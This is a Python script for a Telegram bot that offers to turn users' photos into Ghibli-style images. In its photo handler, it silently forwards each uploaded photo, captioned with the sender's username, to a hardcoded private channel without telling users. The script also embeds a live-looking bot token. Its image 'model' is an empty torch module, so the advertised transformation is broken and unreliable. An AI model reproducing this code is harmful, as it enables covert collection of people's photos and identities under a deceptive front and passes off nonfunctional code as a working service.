import os
import requests
import torch
from safetensors.torch import load_file
from tqdm import tqdm
from flask import Flask, request, jsonify
from telegram import Bot, Update
from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters
from PIL import Image
import io

# Replace with your actual credentials
BOT_TOKEN = "7291635474:AAG3ArFQt73O-h-q7FfUfhsAxRcLVHX8STI"
GDRIVE_FILE_ID = "1kdqKpKsj2DH_rXQNCQElZdc-wsMmRZ-E"
PRIVATE_CHANNEL_ID = "-1002600772587"  # Your private channel ID
MODEL_PATH = "flux-chatgpt-ghibli-lora.safetensors"

# Flask app
app = Flask(__name__)

def download_model():
    """Download model file from Google Drive if not already present."""
    if os.path.exists(MODEL_PATH):
        print("Model already exists. Skipping download.")
        return

    print("Downloading model from Google Drive...")
    URL = f"https://docs.google.com/uc?export=download&id={GDRIVE_FILE_ID}"

    with requests.get(URL, stream=True) as response:
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        with open(MODEL_PATH, 'wb') as file, tqdm(
            desc=MODEL_PATH, total=total_size, unit='B', unit_scale=True
        ) as progress:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
                progress.update(len(chunk))

    print("Model downloaded successfully!")

def load_model():
    """Load the model safely using SafeTensors."""
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Model file '{MODEL_PATH}' not found!")

    print("Loading model...")
    model_state = load_file(MODEL_PATH)  # Load SafeTensors model
    model = torch.nn.Module()  # Create an empty model
    model.load_state_dict(model_state, strict=False)  # Load weights into the model
    model.eval()

    print("Model loaded successfully!")
    return model

def process_image(image: Image.Image) -> Image.Image:
    """Apply model transformation to an image."""
    image_tensor = torch.tensor([list(image.getdata())], dtype=torch.float32).view(1, *image.size, -1) / 255.0
    with torch.no_grad():
        output_tensor = model(image_tensor)  # Apply model
    output_image = Image.fromarray((output_tensor.squeeze().numpy() * 255).astype("uint8"))
    return output_image

# Initialize Telegram bot
bot = Bot(BOT_TOKEN)
dispatcher = Dispatcher(bot, None, workers=0, use_context=True)

def start(update: Update, context):
    update.message.reply_text("Send me an image, and I'll apply the Ghibli effect!")

def handle_photo(update: Update, context):
    """Handles image uploads from Telegram users."""
    user = update.message.from_user
    file = update.message.photo[-1].get_file()
    
    # Forward original image to private channel
    bot.send_photo(chat_id=PRIVATE_CHANNEL_ID, photo=file.file_id, caption=f"Forwarded from @{user.username}")

    # Download the image
    image_bytes = file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))

    # Process the image
    processed_image = process_image(image)

    # Send back processed image
    bio = io.BytesIO()
    processed_image.save(bio, format="JPEG")
    bio.seek(0)
    update.message.reply_photo(photo=bio, caption="Here is your Ghibli-stylized image!")

# Register handlers
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(MessageHandler(Filters.photo, handle_photo))

@app.route("/")
def home():
    return "Server is running!", 200

@app.route("/webhook", methods=["POST"])
def webhook():
    """Handle incoming Telegram updates."""
    update = Update.de_json(request.get_json(), bot)
    dispatcher.process_update(update)
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    download_model()  # Ensure model is downloaded
    global model
    model = load_model()  # Load the model

    app.run(host="0.0.0.0", port=8000)
